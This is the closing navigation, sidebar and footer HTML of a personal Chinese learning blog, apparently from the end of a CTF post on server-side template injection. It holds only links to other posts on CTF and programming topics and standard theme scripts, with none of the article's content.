title="ctfweb-SSTI服务器模板注入">ctfweb-SSTI服务器模板注入</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Fanqie" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Fanqie</p><div class="description" itemprop="description">学习博客</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">32</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">24</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">16</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tLzI3NDA5MDg5MTE=" title="https:&#x2F;&#x2F;github.com&#x2F;2740908911"><i class="ic i-github"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS9hby1saS1hby1uaW5nLWJ1LWthaS00Mw==" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;ao-li-ao-ning-bu-kai-43"><i class="ic i-zhihu"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTU2NDQ1NTU4Mg==" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;564455582"><i class="ic i-cloud-music"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>主页·home</a></li><li class="item dropdown"><a href="/posts/" rel="section"><i class="ic i-feather"></i>文章·article</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>时序·time</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类·sort</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签·tags</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链·Friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-paper-plane"></i>网址·Links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2021/10/23/ctf/crypto&misc/cryptotal/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/" title="分类于 WEB">WEB</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/http/" title="分类于 http&ja、py代码审计">http&ja、py代码审计</a></div><span><a href="/2021/07/08/ctf/web/http/(ctfwp)http&java/" title="(ctfwp)http&amp;java">(ctfwp)http&java</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/" title="分类于 WEB">WEB</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/upload/" title="分类于 upload及蚁剑运用">upload及蚁剑运用</a></div><span><a href="/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/" title="(ctfwp)upload类题目及蚁剑的运用">(ctfwp)upload类题目及蚁剑的运用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/debug/" title="分类于 debug心得贴">debug心得贴</a> <i class="ic i-angle-right"></i> <a href="/categories/debug/wsl/" title="分类于 wsl">wsl</a></div><span><a href="/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/" title="wsl2安装使用及debug心得">wsl2安装使用及debug心得</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ICT/" title="分类于 ICT">ICT</a> <i class="ic i-angle-right"></i> <a href="/categories/ICT/Datacom%E7%AC%94%E8%AE%B0/" title="分类于 Datacom笔记">Datacom笔记</a></div><span><a href="/2022/01/29/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E7%BD%91%E7%BB%9C%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/" title="ICT笔记-网络参考模型">ICT笔记-网络参考模型</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/" title="分类于 WEB">WEB</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/sql/" title="分类于 SQL注入">SQL注入</a></div><span><a href="/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" title="ctfweb-各种盲注脚本">ctfweb-各种盲注脚本</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E9%97%B2%E8%AF%9D%E9%9A%8F%E7%AC%94/" title="分类于 闲话随笔">闲话随笔</a></div><span><a href="/2022/01/13/2021%E6%80%BB%E7%BB%93%E9%9A%8F%E7%AC%94/" title="2021总结随笔">2021总结随笔</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/program/" title="分类于 编程学习">编程学习</a> <i class="ic i-angle-right"></i> <a href="/categories/program/py/" title="分类于 python">python</a> <i class="ic i-angle-right"></i> <a href="/categories/program/py/pystudy/" title="分类于 py学习">py学习</a></div><span><a href="/2021/06/29/program/py/pystudy/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/" title="python学习中部分易忘知识点">python学习中部分易忘知识点</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/" title="分类于 WEB">WEB</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/sql/" title="分类于 SQL注入">SQL注入</a></div><span><a href="/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="(ctfwp)sql堆叠注入及预编译的学习">(ctfwp)sql堆叠注入及预编译的学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/" title="分类于 WEB">WEB</a> <i class="ic i-angle-right"></i> <a href="/categories/ctf/web/file/" title="分类于 文件包含及伪协议">文件包含及伪协议</a></div><span><a href="/2021/07/27/ctf/web/file/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="(ctfwp)伪协议文件包含漏洞">(ctfwp)伪协议文件包含漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/program/" title="分类于 编程学习">编程学习</a> <i class="ic i-angle-right"></i> <a href="/categories/program/py/" title="分类于 python">python</a> <i class="ic i-angle-right"></i> <a href="/categories/program/py/pysolve/" title="分类于 py实操">py实操</a></div><span><a href="/2022/05/25/program/py/pysolve/CTFRSAtools/" title="CTFRSAtools">CTFRSAtools</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Fanqie @ FanqieのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">84k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">1:16</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2021/11/23/ctf/web/ssti/ctfweb-SSTI服务器模板注入/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->